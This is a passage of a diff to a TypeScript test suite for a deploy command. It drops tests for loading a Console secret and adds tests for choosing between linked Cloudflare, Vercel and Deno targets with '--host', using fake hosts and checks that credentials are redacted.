     const hosts = await fakeHosts({ DENO_DEPLOY_ORG: organization, DENO_DEPLOY_TOKEN: "deno-token-1" })
     const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     const calls = await hosts.calls()
-    expect(calls.some(call => call.argv.includes("load"))).toBe(true)
-    expect(calls.some(call => call.argv.includes("--prod"))).toBe(true)
+    expect(calls.some(call => call.argv.includes("create"))).toBe(true)
     for (const call of calls) {
       expect(call.argv.slice(call.argv.indexOf("--org"), call.argv.indexOf("--org") + 4)).toEqual(["--org", "linked-org", "--app", "linked-app"])
     }
-    expectNoLeak(calls, result.stdout + result.stderr, [HASH, ...tokens])
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
   })
 
-  it("creates the app, loads the secret from /dev/stdin, then deploys again", async () => {
-    const root = await builtProject("deno", consoleLink())
+  it("creates the app with the first deploy", async () => {
+    const root = await builtProject("deno")
     const hosts = await fakeHosts(denoEnv)
     const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
-    const app = ["--json", "--non-interactive", "--org", "acme", "--app", "my-app"]
     expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
-      [["deploy", "env", "list", ...app], ""],
       [["deploy", "create", ".", "--source", "local", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
-      [["deploy", "env", "load", "/dev/stdin", ...app], `VITEHUB_CONSOLE_TOKEN_SHA256=${HASH}\n`],
-      [["deploy", "env", "list", ...app], ""],
-      [["deploy", "create", ".", "--source", "local", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
-      [["deploy", ".", "--prod", "--config", "deno.json", "--allow-node-modules", "--org", "acme", "--app", "my-app"], ""],
     ])
-    expect(result.json).toEqual({ console: { linkUrl: linkUrl("https://my-app.acme.deno.net"), secret: "set" }, host: "deno", schemaVersion: 1, url: "https://my-app.acme.deno.net" })
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
+    expect(result.json).toEqual({ env: noEnv, host: "deno", schemaVersion: 1, url: "https://my-app.acme.deno.net" })
+    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
   })
 
   it("needs the organization, and has no --preview or --temporary", async () => {
@@ -403,47 +452,126 @@ describe("vitehub deploy on Deno", () => {
   })
 })
 
-describe("vitehub deploy", () => {
-  it.each(["cloudflare", "vercel"] as const)("restores %s temporary output before authenticated and no-Console reuse", async (host) => {
-    const file = host === "cloudflare" ? ".output/server/wrangler.json" : ".vercel/output/functions/__server.func/.vc-config.json"
-    const variable = host === "cloudflare" ? "vars" : "environment"
-    const root = await builtProject(host, consoleLink())
-    const original = await readFile(join(root, file), "utf8")
-    const temporary = await fakeHosts()
-    expect((await deploy(["--no-build", "--yes", "--temporary"], root, temporary.env)).exitCode).toBe(0)
-    expect((await temporary.calls())[0]!.generated).toMatchObject({ [variable]: { VITEHUB_CONSOLE_TOKEN_SHA256: HASH } })
-    expect(await readFile(join(root, file), "utf8")).toBe(original)
+function recordBuilds(): { spawn: ViteHubCliSpawn, hosts: [string | undefined, string | undefined][] } {
+  const hosts: [string | undefined, string | undefined][] = []
+  const spawn: ViteHubCliSpawn = async (_command, _args, options) => {
+    const host = options?.env?.VITEHUB_HOST
+    hosts.push([host, options?.env?.VITEHUB_HOST_SOURCE])
+    if (host === "cloudflare" || host === "vercel" || host === "netlify" || host === "deno") {
+      for (const [file, content] of Object.entries(buildOutput(host))) {
+        await mkdir(dirname(join(options!.cwd!, file)), { recursive: true })
+        await writeFile(join(options!.cwd!, file), content)
+      }
+    }
+    return { exitCode: 0 }
+  }
+  return { hosts, spawn }
+}
 
-    const authenticated = await fakeHosts(host === "cloudflare" ? cloudflareEnv : vercelEnv)
-    const result = await deploy(["--no-build", "--yes"], root, authenticated.env)
+const twoTargets = (fields: Record<string, unknown>) => JSON.stringify({
+  schemaVersion: 2,
+  ...fields,
+  targets: {
+    cloudflare: { account: { id: "acc-1" }, linkedAt: "", project: { name: "my-app" }, verified: true },
+    vercel: { account: { id: "team_1" }, linkedAt: "", project: { id: "prj_1", name: "my-app" }, verified: true },
+  },
+})
+
+describe("vitehub deploy --host", () => {
+  it("builds with VITEHUB_HOST=vercel and runs the Vercel deploy, next to a default Cloudflare target", async () => {
+    const root = await builtProject("cloudflare", { ".vitehub/link.json": twoTargets({ default: "cloudflare" }) })
+    const hosts = await fakeHosts({ ...cloudflareEnv, ...vercelEnv })
+    const builds = recordBuilds()
+    const result = await deploy(["--host", "vercel", "--yes"], root, hosts.env, { spawn: builds.spawn })
+
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
-    expect((await authenticated.state()).secrets.VITEHUB_CONSOLE_TOKEN_SHA256).toBe(HASH)
-    for (const call of await authenticated.calls()) expect(JSON.stringify(call.generated ?? {})).not.toContain(HASH)
-
-    const link = await readLink(root)
-    delete link.console
-    await writeFile(join(root, ".vitehub/link.json"), JSON.stringify(link))
-    const noConsole = await fakeHosts(host === "cloudflare" ? cloudflareEnv : vercelEnv)
-    expect((await deploy(["--no-build", "--yes"], root, noConsole.env)).exitCode).toBe(0)
-    expect(await noConsole.calls()).toHaveLength(1)
-    expect(JSON.stringify((await noConsole.calls())[0]!.generated)).not.toContain(HASH)
-    expectNoLeak([...await temporary.calls(), ...await authenticated.calls(), ...await noConsole.calls()], result.stdout + result.stderr, [HASH, ...tokens])
+    expect(builds.hosts).toEqual([["vercel", "cli"]])
+    const calls = await hosts.calls()
+    expect(calls.map(call => [call.name, ...call.argv.slice(0, 2)])).toEqual([["vercel", "deploy", "--prebuilt"]])
+    expect(calls[0]!.argv).toEqual(expect.arrayContaining(["--project", "prj_1", "--scope", "team_1"]))
+    expect(result.json).toMatchObject({ host: "vercel", url: "https://my-app.vercel.app" })
+    expect(result.stderr).not.toContain("separate on each host")
+    expect(JSON.parse(await readFile(join(root, ".vitehub/link.json"), "utf8"))).toEqual(JSON.parse(twoTargets({ default: "cloudflare" })))
   })
 
-  it.each(["cloudflare", "vercel"] as const)("restores %s temporary output after a failed deploy", async (host) => {
-    const files = host === "cloudflare"
-      ? [".output/server/wrangler.json"]
-      : [".vercel/output/functions/__server.func/.vc-config.json", ".vercel/output/functions/other.func/.vc-config.json"]
-    const config = host === "cloudflare" ? { name: "my-app", vars: { KEEP: "yes", VITEHUB_CONSOLE_TOKEN_SHA256: "previous" } } : { environment: { KEEP: "yes", VITEHUB_CONSOLE_TOKEN_SHA256: "previous" } }
-    const original = JSON.stringify(config)
-    const root = await builtProject(host, { ...consoleLink(), ...Object.fromEntries(files.map(file => [file, original])) })
-    const hosts = await fakeHosts({ FAKE_HOST_FAIL: host === "cloudflare" ? "wrangler deploy ./server/wrangler.json" : "vercel deploy" })
-    const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)
-    expect(result.exitCode, result.stdout + result.stderr).toBe(1)
-    for (const file of files) expect(await readFile(join(root, file), "utf8")).toBe(original)
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr)
+  it("uses the default target without --host", async () => {
+    const root = await builtProject("vercel", { ".vitehub/link.json": twoTargets({ default: "cloudflare" }) })
+    const hosts = await fakeHosts({ ...cloudflareEnv, ...vercelEnv })
+    const builds = recordBuilds()
+    const result = await deploy(["--yes"], root, hosts.env, { spawn: builds.spawn })
+
+    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
+    expect(builds.hosts).toEqual([["cloudflare", "cli"]])
+    expect((await hosts.calls()).map(call => call.name)).toEqual(["wrangler"])
+    expect(result.json.host).toBe("cloudflare")
   })
 
+  it("fails with a fix line when several hosts are linked and none is the default", async () => {
+    const root = await builtProject("cloudflare", { ".vitehub/link.json": twoTargets({}) })
+    const hosts = await fakeHosts({ ...cloudflareEnv, ...vercelEnv })
+    const builds = recordBuilds()
+    const result = await deploy(["--yes"], root, hosts.env, { spawn: builds.spawn })
+
+    expect(result.exitCode).toBe(2)
+    expect(result.json.error?.code).toBe("SETUP_LINK_HOST_REQUIRED")
+    expect(result.json.error?.why).toContain("cloudflare, vercel")
+    expect(result.json.error?.fix).toBe("Run `vitehub deploy --host <host>`, or make one host the default with `vitehub link --host <host> --default`.")
+    expect(result.json.missing).toEqual([{ choices: [{ id: "cloudflare" }, { id: "vercel" }], field: "host" }])
+    expect(builds.hosts).toEqual([])
+    expect(await hosts.calls()).toEqual([])
+
+    expect((await deploy(["--host", "vercel", "--yes"], root, hosts.env, { spawn: builds.spawn })).exitCode).toBe(0)
+  })
+
+  it("reads a version 1 link file as the default target, and adds a new host next to it with a note once", async () => {
+    const root = await builtProject("cloudflare", {
+      ".vitehub/link.json": JSON.stringify({ account: { id: "acc-1" }, host: "cloudflare", linkedAt: "", project: { name: "linked-worker" }, schemaVersion: 1, verified: true }),
+    })
+    const hosts = await fakeHosts({ ...cloudflareEnv, ...vercelEnv })
+    const builds = recordBuilds()
+
+    const first = await deploy(["--yes"], root, hosts.env, { spawn: builds.spawn })
+    expect(first.exitCode, first.stdout + first.stderr).toBe(0)
+    expect(first.json.url).toContain("linked-worker")
+
+    const vercel = await deploy(["--host", "vercel", "--yes"], root, hosts.env, { spawn: builds.spawn })
+    expect(vercel.exitCode, vercel.stdout + vercel.stderr).toBe(0)
+    expect(vercel.stderr).toContain("[vitehub] vercel is a new host for this app, next to cloudflare. Resources such as D1, KV, R2, and libSQL are separate on each host")
+    expect(builds.hosts).toEqual([["cloudflare", "cli"], ["vercel", "cli"]])
+    expect(JSON.parse(await readFile(join(root, ".vitehub/link.json"), "utf8"))).toEqual({
+      default: "cloudflare",
+      schemaVersion: 2,
+      targets: {
+        cloudflare: { account: { id: "acc-1" }, linkedAt: "", project: { name: "linked-worker" }, verified: true },
+        vercel: { account: { id: "team_1" }, linkedAt: expect.any(String), project: { name: "my-app" }, verified: false },
+      },
+    })
+
+    const again = await deploy(["--host", "vercel", "--yes"], root, hosts.env, { spawn: builds.spawn })
+    expect(again.exitCode).toBe(0)
+    expect(again.stderr).not.toContain("separate on each host")
+  })
+
+  it("rejects a build output made for another host, and an unknown or Node host", async () => {
+    const root = await builtProject("cloudflare", { ".vitehub/link.json": twoTargets({ default: "cloudflare" }) })
+    const hosts = await fakeHosts({ ...cloudflareEnv, ...vercelEnv })
+    for (const [file, content] of Object.entries(buildOutput("vercel"))) {
+      await mkdir(dirname(join(root, file)), { recursive: true })
+      await writeFile(join(root, file), content)
+    }
+    await writeFile(join(root, ".vercel/output/deployment.json"), JSON.stringify({ host: "cloudflare" }))
+    const stale = await deploy(["--host", "vercel", "--no-build", "--yes"], root, hosts.env)
+    expect(stale.exitCode).toBe(3)
+    expect(stale.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
+    expect(stale.json.error?.fix).toContain("vitehub deploy --host vercel")
+
+    expect((await deploy(["--host", "node", "--yes"], root, hosts.env)).json.error?.code).toBe("SETUP_DEPLOY_HOST_UNSUPPORTED")
+    expect((await deploy(["--host", "heroku", "--yes"], root, hosts.env)).json.error?.code).toBe("CLI_R0003")
+    expect(await hosts.calls()).toEqual([])
+  })
+})
+
+describe("vitehub deploy", () => {
   it.each([false, true])("redacts echoed host credentials with failure=%s", async (fail) => {
     const root = await builtProject("cloudflare")
     const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_ECHO_TOKEN: "1", ...(fail ? { FAKE_HOST_FAIL: "wrangler deploy ./server/wrangler.json" } : {}) })
@@ -457,7 +585,7 @@ describe("vitehub deploy", () => {
 
   it.each([undefined, "other-account"])("uses the linked Cloudflare account and Worker when the credential account is %s", async (accountId) => {
     const root = await builtProject("cloudflare", {
-      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-account" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "cloudflare", project: { name: "linked-worker" }, schemaVersion: 1, verified: true, linkedAt: "" }),
+      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-account" }, host: "cloudflare", project: { name: "linked-worker" }, schemaVersion: 1, verified: true, linkedAt: "" }),
     })
     const hosts = await fakeHosts({ CLOUDFLARE_API_TOKEN: cloudflareEnv.CLOUDFLARE_API_TOKEN, ...(accountId ? { CLOUDFLARE_ACCOUNT_ID: accountId } : {}) })
     for (const flags of [[], ["--preview"]]) {
@@ -508,35 +636,28 @@ describe("vitehub deploy", () => {
     expect(failed.json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")
   })
 
-  it.each(["vercel", "netlify", "node"])("rejects a linked Cloudflare host conflicting with configured %s before building or uploading stale output", async (preset) => {
+  it.each(["vercel", "netlify", "node"])("builds for the linked Cloudflare host when the config names %s", async (preset) => {
     const root = await builtProject("cloudflare", {
       ".vitehub/link.json": JSON.stringify({ host: "cloudflare", linkedAt: "", project: { name: "my-app" }, schemaVersion: 1, verified: true }),
-      "vite.config.ts": `import { vitehub } from "vite-hub"\nexport default { plugins: [vitehub({ preset: "${preset}" })] }\n`,
+      "vite.config.ts": `import { vitehub } from "vite-hub"\nexport default { plugins: [vitehub({ host: "${preset}" })] }\n`,
     })
     const hosts = await fakeHosts(cloudflareEnv)
-    const spawned: string[] = []
-    const spawn: ViteHubCliSpawn = async (command) => {
-      spawned.push(command)
-      return { exitCode: 0 }
-    }
-    for (const args of [["--yes"], ["--no-build", "--yes"]]) {
-      const result = await deploy(args, root, hosts.env, { spawn })
-      expect(result.exitCode, result.stdout + result.stderr).toBe(3)
-      expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
-      expect(result.loadConfig).not.toHaveBeenCalled()
-    }
-    expect(spawned).toEqual([])
-    expect(await hosts.calls()).toEqual([])
+    const builds = recordBuilds()
+    const result = await deploy(["--yes"], root, hosts.env, { spawn: builds.spawn })
+    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
+    expect(result.loadConfig).not.toHaveBeenCalled()
+    expect(builds.hosts).toEqual([["cloudflare", "cli"]])
+    expect((await hosts.calls()).map(call => call.name)).toEqual(["wrangler"])
   })
 
   it("needs a build script and a build output for the host", async () => {
     const noScript = await builtProject("cloudflare", { "package.json": JSON.stringify({ name: "my-app" }) })
     expect((await deploy(["--yes"], noScript, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_BUILD_FAILED")
 
-    const unbuilt = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub({ preset: \"cloudflare\" })] }\n" })
+    const unbuilt = await createProject({ "package.json": JSON.stringify({ name: "my-app" }), "vite.config.ts": "import { vitehub } from \"vite-hub\"\nexport default { plugins: [vitehub({ host: \"cloudflare\" })] }\n" })
     expect((await deploy(["--no-build", "--yes"], unbuilt, (await fakeHosts(cloudflareEnv)).env)).json.error?.code).toBe("SETUP_DEPLOY_OUTPUT_MISSING")
 
-    const mismatch = await builtProject("cloudflare", { ".output/deployment.json": JSON.stringify({ preset: "node" }) })
+    const mismatch = await builtProject("cloudflare", { ".output/deployment.json": JSON.stringify({ host: "node" }) })
     const result = await deploy(["--no-build", "--yes"], mismatch, (await fakeHosts(cloudflareEnv)).env)
     expect(result.exitCode).toBe(3)
     expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_MISMATCH")
@@ -549,7 +670,7 @@ describe("vitehub deploy", () => {
     expect(result.json.error?.code).toBe("SETUP_DEPLOY_HOST_UNSUPPORTED")
   })
 
-  it("deploys without a Console link and prints the URL", async () => {
+  it("prints the URL", async () => {
     const root = await builtProject("cloudflare")
     const result = await runSetup(["deploy", "--no-build", "--yes"], root, (await fakeHosts(cloudflareEnv)).env)
     expect(result.exitCode, result.stderr).toBe(0)
